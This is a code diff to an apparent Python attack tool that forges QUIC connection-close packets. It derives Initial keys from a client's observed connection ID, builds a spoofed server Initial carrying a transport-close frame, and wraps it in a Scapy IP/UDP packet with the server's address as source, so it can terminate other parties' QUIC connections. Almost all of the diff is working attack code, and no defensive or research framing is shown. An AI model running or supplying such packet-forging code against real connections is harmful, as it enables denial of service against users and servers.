@@ -10,6 +10,9 @@ from quic_crypto import *
 from aioquic.quic.packet import pull_quic_header
 from aioquic.buffer import Buffer
 from aioquic.quic.crypto import CryptoPair
+from aioquic.quic.packet import QuicPacketType
+from aioquic.quic.packet_builder import QuicPacketBuilder
+from connection_close import QUIC_CONNECTION_CLOSE_0x1C_PAYLOAD
 import os
 
 def _encode_varint_2(value: int) -> bytes:        # 2-byte QUIC varint
@@ -43,9 +46,9 @@ def forge_cc_scapy(
     hdr += VERSION_CONSTANTS["bytes"][ver]
     hdr += bytes([len(dcid_header)]) + dcid_header     # DCID
     
-    #hdr += b"\x00"                                     # SCID length = 0
-    server_scid = os.urandom(8)
-    hdr += bytes([len(server_scid)]) + server_scid
+    hdr += b"\x00"                                     # SCID length = 0
+    #server_scid = os.urandom(8)
+    #hdr += bytes([len(server_scid)]) + server_scid
     #hdr += bytes([len(dcid_secret)]) + dcid_secret     # SCID
     hdr += b"\x00"                                    # Token length  = 0  ← NEW
     
@@ -98,3 +101,45 @@ def forge_cc_scapy(
     return (IP(src=tpl[2], dst=tpl[0]) /
             UDP(sport=tpl[3], dport=tpl[1]) /
             Raw(protected_pkt))
+
+
+def forge_cc_2(tpl: Tuple[str,int,str,int], client_scid: bytes, client_dcid: bytes, version: int):
+
+    # 1) Choose the server's Source CID (SCID) for the response
+    server_scid = os.urandom(8)
+
+    # 2) Derive Initial keys from the client's *first Initial* DCID
+    crypto = CryptoPair()
+    crypto.setup_initial(client_dcid, is_client=False, version=version)
+
+    # 3) Build a server Initial:
+    #    DCID = client_scid, SCID = server_scid
+    builder = QuicPacketBuilder(
+        is_client=False,
+        version=version,
+        max_datagram_size=1200,   # typical choice for Initial datagrams
+        peer_cid=client_scid,     # DCID in long header
+        host_cid=server_scid,     # SCID in long header
+        peer_token=b"",           # server Initial normally has empty token
+        packet_number=0,
+    )
+
+    builder.start_packet(QuicPacketType.INITIAL, crypto)
+
+    cc = QUIC_CONNECTION_CLOSE_0x1C_PAYLOAD(
+        error_code=0x10,
+        frame_type=0,
+        reason_phrase=b"oops!"
+    )
+    frame  = bytes(cc)
+
+    buf = builder.start_frame(0x1C, capacity=1 + len(frame)) # 0x1C is for transport close
+    buf.push_bytes(frame)
+
+    datagrams, _packets = builder.flush()
+    if len(datagrams) == 1:
+        return (IP(src=tpl[2], dst=tpl[0]) /
+            UDP(sport=tpl[3], dport=tpl[1]) /
+            Raw(datagrams[0]))
+    print("Shit happens")
+    return None
